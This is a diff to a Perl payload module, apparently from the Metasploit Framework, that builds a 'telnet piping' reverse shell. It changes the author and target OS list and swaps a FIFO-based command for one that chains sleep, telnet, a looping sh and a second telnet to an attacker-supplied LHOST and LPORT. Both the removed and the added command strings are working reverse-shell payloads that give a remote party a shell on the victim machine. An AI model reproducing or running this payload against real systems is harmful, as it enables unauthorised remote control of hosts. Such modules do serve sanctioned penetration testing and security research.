@@ -20,9 +20,9 @@ my $info =
   'Name'         => 'Unix Telnet Piping Reverse Shell',
   'Version'      => '$Revision$',
   'Description'  => 'Use telnet|sh|telnet to simulate reverse shell',
-  'Authors'      => [ 'H D Moore <hdm [at] metasploit.com>', ],
+  'Authors'      => [ 'spoonm <ninjatools [at] hush.com>', ],
   'Priv'         => 0,
-  'OS'           => [ 'solaris', 'linux', 'bsd' ],
+  'OS'           => [ 'linux', 'bsd', 'hpux', 'irix', 'aix', 'solaris' ],
 };
 
 sub new {
@@ -34,21 +34,17 @@ sub new {
   return($self);
 }
 
-# We create a fifo and force the first telnet process to read from it,
-# this prevents it from exiting if there is no stdin in the remote
-# environment. By piping the output of the second command into the
-# fifo, we can cause the whole sequence to exit cleanly
-
 sub CommandString {
   my $self = shift;
   my $host = $self->GetVar('LHOST');
   my $port = $self->GetVar('LPORT');
 
   my $command =
-  "mknod /tmp/.msfin p;cat /tmp/.msfin|".
-  "telnet $host $port|/bin/sh 2>&1|telnet $host $port >/tmp/.msfin 2>&1;".
-  "rm -f /tmp/.msfin";
-
+    "sleep 99999|".
+    "telnet $host $port|".
+    "while : ; do sh && break; done 2>&1|".
+    "telnet $host $port";
+    
   return($command);
 }
 
